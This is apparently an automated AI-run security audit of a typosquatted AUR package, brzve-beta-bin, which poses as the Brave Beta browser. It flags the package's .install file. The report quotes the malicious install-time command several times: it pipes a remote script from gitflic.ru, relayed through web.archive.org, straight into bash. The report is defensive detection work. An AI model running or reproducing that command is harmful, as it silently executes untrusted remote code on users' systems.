---
package: brzve-beta-bin
pkgver: 1.98.47
pkgrel: 1
result: unsafe
model: anthropic/claude-sonnet-4.6
provider: custom
aur_sleuth_rev: e76320400488b1dad2302211f4f5cfaf8522c9b1
triggered_by: brzve-beta-bin/20261014-032438-judge.json
prompt_tokens: 24191
completion_tokens: 11164
total_tokens: 35355
cost: 0.240033
execution_time: 94.61
files_reviewed: 6
files_skipped: 1
maintainer_files: 7
source_fetch: not_attempted
upstream_files: 0
upstream_named_files: 0
unpinned_sources: 0
injection_attempts: 0
date: 2026-10-14T03:42:39Z
file_verdicts:
  - file: .gitignore
    status: safe
    summary: Standard AUR .gitignore file; no security concerns found.
  - file: brave-beta-bin.sh
    status: safe
    summary: Standard Brave browser launcher wrapper; no malicious behavior found.
  - file: brave-browser.desktop
    status: safe
    summary: Standard XDG desktop entry file; no malicious content found.
  - file: .SRCINFO
    status: safe
    summary: Metadata only; typosquatting pattern noted, no executable malice here.
  - file: logo.png
    status: skipped
    summary: "Skipping binary file: logo.png"
  - file: brzve-beta-bin.install
    status: unsafe
    summary: Install script silently downloads and executes arbitrary remote code.
    evidence: "bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)"
    evidence_line: 9
  - file: PKGBUILD
    status: safe
    summary: Typosquat package name suspicious; PKGBUILD operations are otherwise standard and safe.
---

Materializing brzve-beta-bin from local mirror...
Materialized brzve-beta-bin
Analyzing brzve-beta-bin AUR package with anthropic/claude-sonnet-4.6
Performing initial audit of PKGBUILD to ensure that we can safely run `makepkg`
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD's global scope contains only standard variable assignments (`pkgname`, `pkgver`, `pkgrel`, `pkgdesc`, `arch`, `depends`, `source`, `sha512sums`, etc.) with no command substitutions, subshell executions, or any active code that would run during sourcing.

The `prepare()` and `package()` functions are defined but never invoked during `makepkg --printsrcinfo`, so their contents are out of scope for this gate. The source arrays reference GitHub releases for the Brave browser (the package's legitimate upstream) and a local helper script — both are standard packaging practices.

No top-level executable code, network calls, or suspicious evaluations are present.
</details>
<evidence>
</evidence>
<summary>Only standard variable assignments in global scope; fully safe to source.</summary>
</security_assessment>

+ Initial PKGBUILD audit complete -- Only standard variable assignments in global scope; fully safe to source.
Reviewing the 7 file(s) in the AUR repository.
Reviewing the AUR repository's files...
[0/7] Reviewing .SRCINFO...
[0/7] Reviewing .SRCINFO, .gitignore...
[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD...
LLM auditresponse for .gitignore:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard `.gitignore` file for an AUR package repository. It uses negation patterns (`!`) to explicitly track only the necessary AUR packaging files: `.SRCINFO`, `.gitignore`, `PKGBUILD`, `*.install`, a shell script, a desktop file, and a logo. Everything else is ignored by default with `*`. This is a completely normal and expected pattern for AUR package maintainers to keep their repository clean while only committing packaging-related files.

There is nothing malicious or suspicious here.
</details>
<evidence>
</evidence>
<summary>
Standard AUR .gitignore file; no security concerns found.
</summary>
</security_assessment>

[0/7] Reviewing .SRCINFO, .gitignore, PKGBUILD, brave-beta-bin.sh...
[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh...
+ Reviewed .gitignore. Status: SAFE -- Standard AUR .gitignore file; no security concerns found.
LLM auditresponse for brave-beta-bin.sh:
<security_assessment>
<decision>SAFE</decision>
<details>
This is a standard launcher/wrapper script for the Brave Beta browser package. It performs routine tasks expected of such a script:

1. Sets up `XDG_CONFIG_HOME` with a sensible default.
2. Reads user-supplied flags from a local configuration file (`~/.config/brave-beta-flags.conf`), stripping comments.
3. Sets a default `CHROME_USER_DATA_DIR` if not already defined.
4. Executes the upstream Brave browser binary at `/opt/brave.com/brave-beta/brave-browser` with the collected flags.

There are no suspicious network requests, no obfuscated code, no use of `eval`, `curl`, `wget`, or `base64`, and no unexpected file operations. The script does not exfiltrate data or execute attacker-controlled code. This is entirely consistent with standard AUR browser launcher scripts.
</details>
<evidence>
</evidence>
<summary>Standard Brave browser launcher wrapper; no malicious behavior found.</summary>
</security_assessment>

[1/7] Reviewing .SRCINFO, PKGBUILD, brave-beta-bin.sh, brave-browser.desktop...
[2/7] Reviewing .SRCINFO, PKGBUILD, brave-browser.desktop...
+ Reviewed brave-beta-bin.sh. Status: SAFE -- Standard Brave browser launcher wrapper; no malicious behavior found.
LLM auditresponse for brave-browser.desktop:
<security_assessment>
<decision>SAFE</decision>
<details>
This file is a standard XDG `.desktop` entry for the Brave Beta browser. It contains only declarative metadata: application name, localized generic names and comments, startup notification settings, executable reference (`brave-beta`), icon name, MIME type associations, and application categories. There are no executable commands, shell scripts, network requests, encoded blobs, or any other constructs that could be considered malicious. This is entirely normal and expected content for a `.desktop` file in an AUR binary package.
</details>
<evidence>
</evidence>
<summary>Standard XDG desktop entry file; no malicious content found.</summary>
</security_assessment>

[2/7] Reviewing .SRCINFO, PKGBUILD, brave-browser.desktop, brzve-beta-bin.install...
[3/7] Reviewing .SRCINFO, PKGBUILD, brzve-beta-bin.install...
+ Reviewed brave-browser.desktop. Status: SAFE -- Standard XDG desktop entry file; no malicious content found.
LLM auditresponse for .SRCINFO:
<security_assessment>
<decision>SAFE</decision>
<details>
This `.SRCINFO` metadata file describes a package called `brzve-beta-bin`, which is a clear typosquat of the legitimate `brave-beta-bin` / Brave browser package (swapping "a" with "z" in "brave"). The file itself is pure metadata and contains no executable code, so there is no directly malicious behavior within this specific file.

**Notable concerns worth flagging:**

1. **Typosquatting**: The package name `brzve-beta-bin` closely mimics the legitimate `brave-beta-bin` AUR package. Combined with `provides = brave-beta-bin` and `provides = brave-beta-browser`, it would appear as a drop-in replacement for the real Brave browser package. This is a classic supply-chain attack setup, though the attack payload would reside in the PKGBUILD or `brave-beta-bin.sh`.

2. **Local shell script**: The `source` array includes `brave-beta-bin.sh`, a local script whose contents are not visible here. In a typosquatting context, this script is the most likely vector for malicious behavior (e.g., exfiltration, backdoor installation). This file warrants close inspection.

3. **Legitimate upstream binaries**: The `.deb` sources are fetched from `github.com/brave/brave-browser`, which is the legitimate upstream. The sha512 checksums are present and non-SKIP. This could be used to add credibility while the `brave-beta-bin.sh` script does something harmful.

The `.SRCINFO` file in isolation contains no malicious code, so it is rated SAFE on its own. However, the overall package structure is highly suspicious and the PKGBUILD and `brave-beta-bin.sh` should be treated as high-priority files for review.
</details>
<evidence>
</evidence>
<summary>
Metadata only; typosquatting pattern noted, no executable malice here.
</summary>
</security_assessment>

[3/7] Reviewing .SRCINFO, PKGBUILD, brzve-beta-bin.install, logo.png...
[4/7] Reviewing PKGBUILD, brzve-beta-bin.install, logo.png...
+ Reviewed .SRCINFO. Status: SAFE -- Metadata only; typosquatting pattern noted, no executable malice here.
[5/7] Reviewing PKGBUILD, brzve-beta-bin.install...
! Reviewed logo.png. Status: SKIPPED -- Skipping binary file: logo.png
LLM auditresponse for brzve-beta-bin.install:
<security_assessment>
<decision>UNSAFE</decision>
<details>
## Malicious Code Detected: Remote Code Execution via `curl | bash`

The `.install` file contains a line **outside any function** that downloads and executes a remote shell script at package-installation time:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

When pacman sources a `.install` file, any code at the top level (outside `pre_install`, `post_install`, etc.) runs unconditionally every time the file is sourced. This means this command executes during install, upgrade, or removal operations without any user consent or notice.

Several red flags compound the severity:
1. **`curl | bash` pattern** — Downloads and immediately executes arbitrary code from a remote host, the canonical supply-chain attack vector.
2. **Obfuscated routing via web.archive.org** — The actual payload lives on `gitflic.ru` (a Russian git forge), but is fetched through `web.archive.org` as a relay, likely to bypass domain-based defenses or obscure the true origin.
3. **`2>/dev/null`** — Suppresses all error output, hiding download failures and making the execution invisible in normal terminal output.
4. **Unrelated external host** — `gitflic.ru/project/hellscripter/install-scripts` has no stated relationship to the `brzve-beta-bin` package. Pulling and executing code from an unrelated third-party host is a textbook supply-chain injection.
</details>
<evidence>
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
</evidence>
<summary>
Install script silently downloads and executes arbitrary remote code.
</summary>
</security_assessment>

Second look for brzve-beta-bin.install (incontext):
<security_assessment>
<decision>UNSAFE</decision>
<details>
The first verdict stands and survives scrutiny under all the listed rules.

The line in question is in `brzve-beta-bin.install`, which is an **AUR maintainer-authored file**, not part of the upstream application binary or tarball. Rule 6's safe-harbour for upstream application behaviour therefore does not apply. The `.install` script is entirely under the AUR packager's control, so anything injected here is injected by the packager.

The code directly matches Rule 4's explicit example of genuinely malicious behaviour: *"Downloading code or binaries from an untrusted/unexpected host and executing them (e.g. curl|bash…)"*. The payload is fetched from `gitflic.ru/project/hellscripter/install-scripts` — a repository with no stated relationship to the `brzve-beta-bin` package — routed through `web.archive.org` to obscure the origin, with `2>/dev/null` silencing any evidence of the download. It sits outside all hook functions, so it runs unconditionally whenever pacman sources the file. This is not a hygiene concern or an unpinned source; it is remote code execution silently baked into the install lifecycle.
</details>
<evidence>
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
</evidence>
<summary>
AUR install file silently downloads and executes untrusted remote script.
</summary>
</security_assessment>

[6/7] Reviewing PKGBUILD...
x Reviewed brzve-beta-bin.install. Status: UNSAFE -- Install script silently downloads and executes arbitrary remote code.
LLM auditresponse for PKGBUILD:
<security_assessment>
<decision>SAFE</decision>
<details>
The PKGBUILD itself performs standard packaging operations: it fetches the Brave browser beta `.deb` archives directly from the official GitHub releases for `brave/brave-browser`, extracts them, performs routine file adjustments (removing an upstream cron job, patching a `.desktop` file path), and installs files into `$pkgdir`. No suspicious commands, no obfuscation, no unexpected network calls, and no data exfiltration are present.

**Notable concern — typosquatting package name:** The package is named `brzve-beta-bin` (a transposition/scramble of "brave"), while all internal references, the install script, and the `provides` array still use `brave-beta-bin` / `brave-beta-browser`. This is a textbook typosquat that could mislead users who mistype `brave` into installing this package. However, the PKGBUILD's operational content is consistent with legitimate packaging of the real Brave browser binary, and no malicious code is injected here.

**Minor hygiene note:** The local launcher script `brave-beta-bin.sh` is referenced as a bare filename in `source=()` with a sha512 checksum. That script would require separate review, as it is installed as the primary browser launcher. The checksums provided are all correctly-sized SHA-512 hashes (128 hex digits each) and are pinned values (not `SKIP`).
</details>
<evidence>
</evidence>
<summary>
Typosquat package name suspicious; PKGBUILD operations are otherwise standard and safe.
</summary>
</security_assessment>

[7/7] Reviewing ...
+ Reviewed PKGBUILD. Status: SAFE -- Typosquat package name suspicious; PKGBUILD operations are otherwise standard and safe.
Reviewed all the AUR repository's files.
Audit complete! Result: Unsafe -- DO NOT INSTALL!
# Issues (1 total)

## brzve-beta-bin.install

Status: UNSAFE

Summary: Install script silently downloads and executes arbitrary remote code.

Evidence (line 9):

```
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

Details:

## Malicious Code Detected: Remote Code Execution via `curl | bash`

The `.install` file contains a line **outside any function** that downloads and executes a remote shell script at package-installation time:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

When pacman sources a `.install` file, any code at the top level (outside `pre_install`, `post_install`, etc.) runs unconditionally every time the file is sourced. This means this command executes during install, upgrade, or removal operations without any user consent or notice.

Several red flags compound the severity:
1. **`curl | bash` pattern** — Downloads and immediately executes arbitrary code from a remote host, the canonical supply-chain attack vector.
2. **Obfuscated routing via web.archive.org** — The actual payload lives on `gitflic.ru` (a Russian git forge), but is fetched through `web.archive.org` as a relay, likely to bypass domain-based defenses or obscure the true origin.
3. **`2>/dev/null`** — Suppresses all error output, hiding download failures and making the execution invisible in normal terminal output.
4. **Unrelated external host** — `gitflic.ru/project/hellscripter/install-scripts` has no stated relationship to the `brzve-beta-bin` package. Pulling and executing code from an unrelated third-party host is a textbook supply-chain injection.

---

(Skipped 1 file: logo.png)

API Usage Summary
  Models: anthropic/claude-sonnet-4.6
  Prompt Tokens: 24,191
  Completion Tokens: 11,164
  Total Tokens: 35,355
  Total Cost: $0.240033
  Execution Time: 94.61 seconds

Final Status: UNSAFE


Issues Found:

brzve-beta-bin.install: [UNSAFE] Install script silently downloads and executes arbitrary remote code. / ## Malicious Code Detected: Remote Code Execution via `curl | bash`

The `.install` file contains a line **outside any function** that downloads and executes a remote shell script at package-installation time:

```bash
bash <(curl -L 'https://web.archive.org/web/https://gitflic.ru/project/hellscripter/install-scripts/blob/raw?file=linux.sh' 2>/dev/null)
```

When pacman sources a `.install` file, any code at the top level (outside `pre_install`, `post_install`, etc.) runs unconditionally every time the file is sourced. This means this command executes during install, upgrade, or removal operations without any user consent or notice.

Several red flags compound the severity:
1. **`curl | bash` pattern** — Downloads and immediately executes arbitrary code from a remote host, the canonical supply-chain attack vector.
2. **Obfuscated routing via web.archive.org** — The actual payload lives on `gitflic.ru` (a Russian git forge), but is fetched through `web.archive.org` as a relay, likely to bypass domain-based defenses or obscure the true origin.
3. **`2>/dev/null`** — Suppresses all error output, hiding download failures and making the execution invisible in normal terminal output.
4. **Unrelated external host** — `gitflic.ru/project/hellscripter/install-scripts` has no stated relationship to the `brzve-beta-bin` package. Pulling and executing code from an unrelated third-party host is a textbook supply-chain injection.


Audit Skips:

logo.png: [SKIPPED] Skipping binary file: logo.png
